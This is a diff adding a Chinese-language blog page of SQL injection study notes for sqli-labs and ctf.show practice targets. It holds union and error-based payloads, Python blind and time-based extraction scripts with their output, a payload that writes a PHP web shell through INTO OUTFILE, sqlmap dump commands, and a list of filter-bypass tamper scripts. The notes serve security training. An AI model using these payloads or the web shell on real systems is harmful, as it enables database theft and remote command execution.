@@ -1,0 +1,923 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title> - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="
+
+
+
+
+  
+  
+  
+  sql注入 - Hex...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title"></h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>January 18, 2024</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>20354</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        
+
+<!DOCTYPE html>
+<html lang="cn" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>sql注入 - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="sqli建议在火狐浏览器中安装hackbar插件，可以...">
+  <meta name="author" content="20231201">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">sql注入</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.webp" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">sql注入</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 20, 2023</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>17023</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>建议在火狐浏览器中安装hackbar插件，可以更方便的编辑语句。</p>
+<p>谷歌浏览器官网：<a target="_blank" rel="noopener" href="https://www.google.com/chrome/">https://www.google.com/chrome/</a></p>
+<p>翻墙工具推荐：<a target="_blank" rel="noopener" href="https://console.xenolink.net/#/register?code=vocvktBL">https://console.xenolink.net/#/register?code=vocvktBL</a></p>
+<h3 id="yakit"><a href="#yakit" class="headerlink" title="yakit"></a>yakit</h3><p>安装yakit后点击项目</p>
+<p><img    class="lazyload" data-original="/../img/yakit1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">yakit1</span></p>
+<p><img    class="lazyload" data-original="/../img/yakit2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">yakit2</span></p>
+<p><img    class="lazyload" data-original="/../img/yakit3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">yakit3</span></p>
+<h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>使用教程<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/025bcbbbd97f">https://www.jianshu.com/p/025bcbbbd97f</a></p>
+<p><img    class="lazyload" data-original="/../img/bp%E7%9D%A1%E7%9C%A0%E6%B3%A8%E5%85%A5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">bp睡眠注入</span></p>
+<p><img    class="lazyload" data-original="/../img/bp%E7%9B%B2%E6%B3%A8%E7%88%86%E7%A0%B4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">bp盲注爆破</span></p>
+<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>判断注入点：<br>&#x2F;Less-1&#x2F;?id&#x3D;1’ and 1&#x3D;2– -</p>
+<p>猜字段数：<br>运用order by(二分法)<br><code>/Less-1/?id=2&#39; order by 3-- -</code></p>
+<p>找回显：<br><code>/Less-1/?id=2&#39; union select 1,2,3-- -</code></p>
+<p>查看当前数据库和数据库版本<br>database() 、version()</p>
+<p>爆数据库<br><code>/Less-1/?id=2&#39; and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata</code></p>
+<p>找表名字<br>运用group_concat()函数<br><code>/Less-1/?id=2&#39; and 1=2 union select 1,group_concat(table_name),@@basedir  from information_schema.tables where table_schema=&quot;数据库名&quot;-- -</code></p>
+<p>找字段名<br><code>/Less-1/?id=2&#39; and 1=2 union select 1,group_concat(column_name),@@basedir  from information_schema.columns where table_name=&quot;表名&quot;-- -</code></p>
+<p>爆记录<br><code>/Less-1/?id=2&#39; and 1=2 union select 1,group_concat(id,email_id),3  from 表名-- -</code></p>
+<p>查看内容<br><code>/Less-1/?id=2&#39; and 1=2 union select 1,group_concat(id),group_concat(email_id)  from 表名-- -</code></p>
+<p><code>group_concat(column_name) from information_schema.columns where table_name=&#39;student&#39;#&amp;passwd=&amp;Submit=Submit</code></p>
+<p><img    class="lazyload" data-original="/../img/image-20231220210425667.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">information_schema</span></p>
+<p><img    class="lazyload" data-original="/../img/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">数据库查询</span></p>
+<p><img    class="lazyload" data-original="/../img/%E6%B5%81%E7%A8%8B.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">union联合查询流程</span></p>
+<p><img    class="lazyload" data-original="/../img/%E6%B3%A8%E9%87%8A.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">注释</span></p>
+<p><img    class="lazyload" data-original="/../img/mysql%E5%87%BD%E6%95%B0.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">mysql函数</span></p>
+<p><img    class="lazyload" data-original="/../img/mysql%E5%87%BD%E6%95%B01.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">mysql函数1</span></p>
+<h3 id="postman操作"><a href="#postman操作" class="headerlink" title="postman操作"></a>postman操作</h3><p>在firefox的相关网页打开网络，刷新网页找到api，打开postman按要求输入get或post等传输方式与地址，新建key：id，在value中执行语句。展示的效果与在浏览器网址输入类似，但更为清晰。</p>
+<p><img    class="lazyload" data-original="/../img/image-20231223164233443.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">示例</span></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="报错注入十大方法"><a href="#报错注入十大方法" class="headerlink" title="报错注入十大方法"></a>报错注入十大方法</h4><p><code>1.floor() 　　如：select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
+<p><code>2.extractvalue()　　如：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></p>
+<p><code>3.updatexml()　　如：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
+<p><code>4.geometrycollection()　　如：select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></p>
+<p><code>5.multipoint()　　如：select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></p>
+<p><code>6.polygon()　　如：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></p>
+<p><code>7.multipolygon()　　如：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></p>
+<p><code>8.linestring()　　如：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></p>
+<p><code>9.multilinestring()　　如：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></p>
+<p><code>10.exp()　　如：select * from test where id=1 and exp(~(select * from(select user())a));</code></p>
+<h4 id="python脚本sql注入-盲注"><a href="#python脚本sql注入-盲注" class="headerlink" title="python脚本sql注入(盲注)"></a>python脚本sql注入(盲注)</h4><p>利用py写一个通过二分法在ASCII码32到128范围内逐个推断user()的脚本。</p>
+<p>如<code>http://192.168.2.60/sqli/Less-8/?id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -</code></p>
+<p>这段语句就是通过转化为ASCII码的方式找出需要的信息，但在码表中一个个寻找符合的字符显然需要耗费过多精力，因此通过脚本来更轻易的实现功能</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">import requests<br>session = requests.session()<br>url = &quot;http://192.168.2.60/sqli/Less-8/?id=1&#x27;&quot;<br>def db():<br>    name = &#x27;&#x27;<br>    for i in range(1,50):<br>        begin =32<br>        end =128<br>        tmp = (begin+end)//2<br>        while begin &lt; end :<br>            paramsGet = url+ &quot;/**/and/**/ascii(substr(user(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp)<br>            response = session.get(paramsGet)<br>            if &#x27;You are in...........&#x27; in response.text:<br>                begin = tmp + 1<br>                tmp = (begin+end)//2<br>            else:<br>                end = tmp<br>                tmp = (begin+end)//2<br>        if(tmp==32):<br>            break<br>        name += chr(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
+
+<p>显示结果如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs txt">PS C:\Users\Administrator&gt; &amp; C:/env/python3.12/python.exe c:/Users/Administrator/Desktop/py/1.py<br>r<br>ro<br>roo<br>root<br>root@<br>root@l<br>root@lo<br>root@loc<br>root@loca<br>root@local<br>root@localh<br>root@localho<br>root@localhos<br>root@localhost<br></code></pre></td></tr></table></figure>
+
+<p>其它相同类型的通过更改相关部分通解，如：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">import requests<br>session = requests.session()<br>url = &quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;<br>def db():<br>    name = &#x27;&#x27;<br>    for i in range(1,50):<br>        begin =32<br>        end =128<br>        tmp = (begin+end)//2<br>        while begin &lt; end :<br>            paramsGet = url+ &quot;/**/and/**/ascii(substr((select group_concat(username,password) from ctfshow_user4 where username=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp)<br>            response = session.get(paramsGet)<br>            if &quot;admin&quot; in response.text:<br>                begin = tmp + 1<br>                tmp = (begin+end)//2<br>            else:<br>                end = tmp<br>                tmp = (begin+end)//2<br>        if(tmp==32):<br>            break<br>        name += chr(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
+
+<h4 id="睡眠注入"><a href="#睡眠注入" class="headerlink" title="睡眠注入"></a>睡眠注入</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs txt">import requests<br>import time<br>session = requests.session()<br>url = &quot;http://192.168.2.60/sqli/Less-9/?id=1&#x27;&quot;<br>def db():<br>    name = &#x27;&#x27;<br>    for i in range(1,10):<br>        begin =32<br>        end =128<br>        tmp = (begin+end)//2<br>        while begin &lt; end :<br>            start_time=time.time()<br>            paramsGet = url+ &quot;/**/and/**/if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,1,sleep(2))--+&quot;.format(i,tmp)<br>            response = session.get(paramsGet)<br>            end_time=time.time() <br>            if end_time-start_time&lt;2:<br>                begin = tmp + 1<br>                tmp = (begin+end)//2<br>            else:<br>                end = tmp<br>                tmp = (begin+end)//2<br>        if(tmp==32):<br>            break<br>        name += chr(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
+
+<h4 id="uagent头注入"><a href="#uagent头注入" class="headerlink" title="uagent头注入"></a>uagent头注入</h4><p>通过连接增加插入语句的方式</p>
+<p><img    class="lazyload" data-original="/../img/image-20231224201705801.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">两种方式</span></p>
+<h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>随便输入，再根据错误提示输入账号。这里就不赘述了</p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><ol>
+<li><p>在phpstudy_pro\Extensions\MySQL5.7.26\my.ini文件中添加语句<code>secure_file_priv=&quot;&quot;</code></p>
+</li>
+<li><p>在网页中执行语句：<code>http://192.168.2.60/sqli/Less-1/?id=-1&#39; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot; -- -</code></p>
+</li>
+<li><p>这时可以看到www文件下出现了phpinfo.php</p>
+<p><img    class="lazyload" data-original="/../img/image-20231223170728014.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">phpinfo.php</span></p>
+</li>
+<li><p>通过在网页输入该文件地址加（?a&#x3D;指令）传参，可控制原机执行指令</p>
+</li>
+</ol>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>在kali中可以直接执行sqlmap</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</a></p>
+<p>查询可操作指令：<code>python3 sqlmap.py -h</code></p>
+<p>查询数据指令：<code>python3 sqlmap.py  -u &quot;http://192.168.2.60/sqli/Less-1/?id=1&quot; --dbs</code>（查询数据库）</p>
+<p><code>python3 sqlmap.py  -u &quot;http://192.168.2.60/sqli/Less-1/?id=1&quot;  --batch -D security --tables</code>（指定查询数据库表）</p>
+<p><code>python3 sqlmap.py  -u &quot;http://192.168.2.60/sqli/Less-1/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</code>（指定查询id，username）</p>
+<p>SQLMap是一款SQL注入神器，可以通过tamper对注入payload 进行编码和变形，以达到绕过某些限制的 目的。但是有些时候，SQLMap自带的Tamper脚本并不是特别好用，需要根据实际情况定制Tamper脚本。</p>
+<p>序号	脚本名称	注释<br>1	0x2char	将每个编码后的字符转换为等价表达<br>2	apostrophemask	单引号替换为Utf8字符<br>3	apostrophenullencode	替换双引号为%00%27<br>4	appendnullbyte	有效代码后添加%00<br>5	base64encode	使用base64编码<br>6	between	比较符替换为between<br>7	bluecoat	空格替换为随机空白字符，等号替换为like<br>8	chardoubleencode	双url编码<br>9	charencode	将url编码<br>10	charunicodeencode	使用unicode编码<br>11	charunicodeescape	以指定的payload反向编码未编码的字符<br>12	commalesslimit	改变limit语句的写法<br>13	commalessmid	改变mid语句的写法<br>14	commentbeforeparentheses	在括号前加内联注释<br>15	concat2concatws	替换CONCAT为CONCAT_WS<br>16	equaltolike	等号替换为like<br>17	escapequotes	双引号替换为\<br>18	greatest	大于号替换为greatest<br>19	halfversionedmorekeywords	在每个关键字前加注释<br>20	htmlencode	html编码所有非字母和数字的字符<br>21	ifnull2casewhenisnull	改变ifnull语句的写法<br>22	ifnull2ifisnull	替换ifnull为if(isnull(A))<br>23	informationschemacomment	标示符后添加注释<br>24	least	替换大于号为least<br>25	lowercase	全部替换为小写值<br>26	modsecurityversioned	空格替换为查询版本的注释<br>27	modsecurityzeroversioned	添加完整的查询版本的注释<br>28	multiplespaces	添加多个空格<br>29	nonrecursivereplacement	替换预定义的关键字<br>30	overlongutf8	将所有字符转义为utf8<br>31	overlongutf8more	以指定的payload转换所有字符<br>32	percentage	每个字符前添加%<br>33	plus2concat	将加号替换为concat函数<br>34	plus2fnconcat	将加号替换为ODBC函数{fn CONCAT()}<br>35	randomcase	字符大小写随机替换<br>36	randomcomments	&#x2F;**&#x2F;分割关键字<br>37	securesphere	添加某字符串<br>38	sp_password	追加sp_password字符串<br>39	space2comment	空格替换为&#x2F;&#x2F;<br>40	space2dash	空格替换为–加随机字符<br>41	space2hash	空格替换为#加随机字符<br>42	space2morecomment	空格替换为&#x2F;_&#x2F;<br>43	space2morehash	空格替换为#加随机字符及换行符<br>44	space2mssqlblank	空格替换为其他空符号<br>45	space2mssqlhash	空格替换为%23%0A<br>46	space2mysqlblank	空格替换为其他空白符号<br>47	space2mysqldash	空格替换为–%0A<br>48	space2plus	空格替换为加号<br>49	space2randomblank	空格替换为备选字符集中的随机字符<br>50	symboliclogical	AND和OR替换为&amp;&amp;和||<br>51	unionalltounion	union all select替换为union select<br>52	unmagicquotes	宽字符绕过GPC<br>53	uppercase	全部替换为大写值<br>54	varnish	添加HTTP头<br>55	versionedkeywords	用注释封装每个非函数的关键字<br>56	versionedmorekeywords	使用注释绕过<br>57	xforwardedfor	添加伪造的HTTP头</p>
+<h5 id="使用正则替换："><a href="#使用正则替换：" class="headerlink" title="使用正则替换："></a>使用正则替换：</h5><p> m &#x3D; “welcome,test” import re re.sub(r”test”,”tiihuan”,m) # 第一个搜索值。第二个替换值，第三个上搜索资源或变量 ‘wlcome,tihuan’   #打印内容</p>
+<h5 id="用replace方法"><a href="#用replace方法" class="headerlink" title="用replace方法"></a>用replace方法</h5><p>python m&#x3D;”welcome, test” m.replace(“test”, ‘’) ‘welcome, ‘  # 打印</p>
+<h5 id="kali-tamper"><a href="#kali-tamper" class="headerlink" title="kali tamper"></a>kali tamper</h5><h6 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h6><p>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;</p>
